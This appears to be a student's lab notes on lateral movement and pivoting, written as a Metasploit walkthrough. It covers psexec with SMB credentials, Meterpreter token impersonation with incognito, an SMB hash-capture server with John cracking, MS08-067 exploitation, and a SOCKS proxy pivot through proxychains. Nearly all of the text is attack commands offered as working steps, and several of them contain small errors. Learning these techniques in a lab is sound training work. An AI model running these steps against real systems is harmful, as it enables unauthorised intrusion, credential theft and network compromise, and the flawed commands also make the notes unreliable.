# Lateral Movement and Pivoting

## Example 1: PSEXec to open a meterpreter session
Use valid SMB credentials to execute a payload remotely on a Windows target using `psexec`.

If it works, Metasploit opens a new Meterpreter session on Kali.

In Kali machine (attacker):

`use exploit/windows/smb/psexec`

Inside Windows, check the conections:


`secpol.msc`

Look for:

    - configuraci√≥n de seguridad local
    - directivas locales
        - opciones de seguridad
        - acceso de red: modelo de seguridad...
            - Set to clasico

Back to Kali:

`set LHOST <ip_address_attacker>`

`set RHOST <ip_address_victim>`

`set User admin`

`set SMBUser admin`

`set SMBPass admin1`

`exploit -j` 

## Example 2: Token impersonation using incognito
After we get a Meterpreter session, we check who we are (often SYSTEM).

Then we list available tokens and impersonate another user token to act as that user.

Once PSExec works and it opens a session:

`session -l` - list sessions

`session -i <id>` - use windows session

Inside meterpreter >:

`getuid` - SYSTEM should appear

`load incognito`

`list tokens -u` 

`impersonate_token <token>` - the token comes with the format `...\user` to make it work, we need to write `...\\user`

`getuid` - user must be changed

## Example 3: Hash capture trigger
1. We start a capture server on Kali that stores captured credentials/hashes in a file.
2. From the Windows victim, we trigger an authentication attempt toward Kali.
3. Finally, we run John locally to try to crack the captured hashes.

In kali machine:

`use auxiliary/server/capture/smtp`

`set JOHNPWFILE <dir_hash_name_file>` - dir where we want to store all the hashes

`exploit -j`

Go to Windows session (meterpreter): `session -i <id>`

`impersonate_token <token_with_doble_\\>`

`shell`

`net use \\192.168.0.1\foo` - attacker ip address used

Now if we do outside msfconsole (kali): `john <dir_hash_name_file>` - we get the passwds

## Example 4: Pivoting using sock proxys

What we want to have: 
- Kali can access to Windows but not to Linux
- Windows can access both (proxy)
- Linux can access Windows but not Kali
Is like a firewall is blocking the communication between Kali and Linux.

### Step 1: Get a meterpreter session on Windows

In kali, let's infect the Windows machine:

1. First ping to check connection.
2. `msfconsole -q`
3. `use exploit/windows/smb/ms08_067_netapi`
4. `set LHOST <ip_address_attacker>`
5. `set RHOST <ip_address_victim_wd>`
6. `exploit`
7. `background` 
8. `use auxiliary/scanner/portscan/tcp` 
9. `set RHOST <ip_address_victim_wd>`
10. `exploit` 

### Step 2: Set the environment
In an other Kali terminal (set the environment as explained):

1. `nmap -p 21 -sS 192.168.0.101`
2. `ssh msfadmin@192.168.0.101` - access to linux machine using ssh
3. `sudo iptables -A INPUT -s <ip_address_victim_wd> -j ACCEPT` - accept more coming from that IP
4. `sudo iptables -L -n` - input chain (controls traffic to access a machine) change it from ACCEPT to DROP so it does not accept what comes from WD
5. `sudo iptables -p INPUT DROP` 
6. Try ping from wd to Linux. It should not work

### Step 3: Add route through Windows session
Now let's reroute the traffic to access Linux from Windows. We tell the metaexploit: to reach the Linux IP go through Windows session

1. `use auxiliary/scanner/portscan/tcp`
2. `session -l` - look for the windows session. Imagine session number = 1
3. `route add 192.168.0.101 255.255.255.255 1` - ip addr = Linux machine // 1 = windows session id
4. `exploit`

### Step 4: Start a socks proxy
1. `use auxiliary/server/socks_proxy`
2. `options` - look for the port 
3. **
4. `exploit -j`

In Kali terminal:

5. `sudo nano /etc/proxychains4.conf`
    At the end of the file add: 
    ``` 
      [ProxyList]
      socks 5 <ip_address_attaker_kali> <port> - the port is the one found in step 5.1
    ```
6. In kali: `proxychains nmap -sS -p 21 192.168.0.101` - ip address linux

If it doesn't work we can change the Sock version:
After step 5:
`set VERSION 4a`
In step 8, specify the version choosen: `sock 4a`
